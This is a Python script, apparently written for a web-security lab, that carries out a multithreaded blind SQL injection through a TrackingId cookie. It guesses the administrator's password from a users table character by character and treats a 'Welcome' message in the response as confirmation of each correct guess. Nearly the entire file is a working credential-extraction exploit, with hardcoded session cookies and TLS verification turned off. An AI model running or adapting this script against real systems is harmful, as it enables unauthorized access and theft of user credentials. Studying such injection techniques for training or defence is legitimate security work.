import sys
import requests 
import urllib 
import urllib3 
from concurrent.futures import ThreadPoolExecutor, as_completed


WELCOME_MSG = 'Welcome'
TRACKING_COOKIE = 'BXrn547wGjyLeHIm'
SESSION_COOKIE = 'oBgnOCaHkacgNWBYarukr0cWNbBIugFT'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def test_char(url, position, char): 
    query = f"' and (Select substring(password,{position},1) from users where username = 'administrator')='{char}'--"
    encoded_query = urllib.parse.quote(query)
    cookies = {
        'TrackingId': f'{TRACKING_COOKIE}{encoded_query}',
        'session': SESSION_COOKIE
    }
    request = requests.get(
        url=url, 
        cookies=cookies,
        verify=False, # to avoid ssl verification on certs. ,
        # headers={"Connection", "close"},
        # timeout=10
    )

    if WELCOME_MSG in request.text:
        return char

    return None
    


def sqli_blind_password_extractor(url):
    '''
        Logic: 
            1. create password to concatenate results
            2. define the set to test
            3. define the constants {cookies}
            3. iterate for the password len
                3.1. define the query
                3.2. encode it
                3.2. define the request

    '''
      
    password = ''
    passwordLen = 20
    charset = [chr(i) for i in range(32,127)]
    for i in range(1,passwordLen + 1): 
        found_char = None
        with ThreadPoolExecutor(max_workers=20) as executor: 
            # submit a future
            futures = {
                executor.submit(test_char, url, i, c) : c 
                for c in charset
            }

            for response in as_completed(futures): 
                result = response.result()

                if result: 
                    found_char = result
                    password += result
                    print(f'found {found_char} at index {i}')
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

    return password


def main (): 
    if len(sys.argv )< 2:
        print('Error, you must provide the url!')
        print('Example Usage: python multithreading.py url')
        sys.exit(-1)
    url = sys.argv[1]
    result = sqli_blind_password_extractor(url)
    print(result)


if __name__ == '__main__':
    main()